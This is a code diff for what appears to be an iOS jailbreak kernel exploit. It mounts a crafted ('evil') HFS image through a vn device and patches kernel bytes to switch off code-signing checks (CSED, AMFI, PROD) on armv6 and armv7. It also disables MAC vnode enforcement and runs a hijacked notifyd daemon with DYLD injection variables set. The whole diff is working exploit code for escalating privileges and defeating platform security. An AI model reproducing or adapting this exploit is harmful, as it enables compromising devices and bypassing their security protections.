@@ -34,7 +34,7 @@ void prepare_vndevice() {
 	ioctl(fd, VNIOCDETACH, &vn);
 
 	// attach
-	vn.vn_file = "hfs_mdb";
+	vn.vn_file = "/usr/lib/hfs_mdb";
 	vn.vn_control = vncontrol_readwrite_io_e;
 	if (ioctl(fd, VNIOCATTACH, &vn) < 0) {
 		printf("Can't attach vn0.\n");
@@ -87,7 +87,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	CSED: 00 00 00 00 01 00 00 00 80 00 00 00 00 00 00 00 => 01 00 00 00 01 00 00 00 80 00 00 00 00 00 00 00 ; armv6 & armv7
 
 	AMFI: 00 B1 00 24 20 46 90 BD  +  0 => 00 B1 01 24 20 46 90 BD ; armv7
-	      0E 00 A0 E1 01 10 84 E2  + 20 => 00 00 00 00 ; armv6
+	      00 00 50 E3 00 00 00 0A  00 40 A0 E3 04 00 A0 E1 + 8 => 01 40 A0 E3 ; armv6
 
 	PROD: 00 23 00 94 01 95 02 95  + 10 => 00 20 00 20 ; armv7 & armv6
 
@@ -115,6 +115,8 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	unsigned int i = 0;
 	unsigned char *paddress = address - 2;
 	
+	kprintf("Entering patch_kernel()\n");
+	
 	for(i = 0; i < size; i+=2) {
 		paddress+=2;
 
@@ -133,10 +135,10 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			_memcpy((char*) &address[target], "\x00\xB1\x01\x24\x20\x46\x90\xBD", 8);
 			continue;
 		}
-		if(mem8eq(paddress, "\x0E\x00\xA0\xE1\x01\x10\x84\xE2")) {
-			target = i + 20;
+		if(mem16eq(paddress, "\x00\x00\x50\xE3\x00\x00\x00\x0A\x00\x40\xA0\xE3\x04\x00\xA0\xE1")) {
+			target = i + 8;
 			kprintf("Found armv6 kernel patch 2 at %p\n", &address[target]);
-			_memcpy((char*) &address[target], "\x00\x00\x00\x00", 4);
+			_memcpy((char*) &address[target], "\x01\x40\xA0\xE3", 4);
 			continue;
 		}
 
@@ -243,7 +245,22 @@ void payload() {
 	// pop	{r7, pc}
 }
 
+int one = 1;
+char* execve_env[]= {NULL};
+char* execve_params[]={"/usr/sbin/notifyd", NULL};
+
 int main(int argc, char* argv[]) {
+	//we must do this as fast as possible (yes this sucks but it kinda works)
+	sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
+
+	printf("pod2g takes the stage ...");
 	prepare_vndevice();
 	mount_evil_hfs();
+	printf("and scores !");
+ 
+	//run the legit daemon we just hijacked
+	setenv("DYLD_INSERT_LIBRARIES", "", 1);
+	setenv("DYLD_FORCE_FLAT_NAMESPACE", "", 1);
+	execve(execve_params[0], execve_params, execve_env);
 }
+
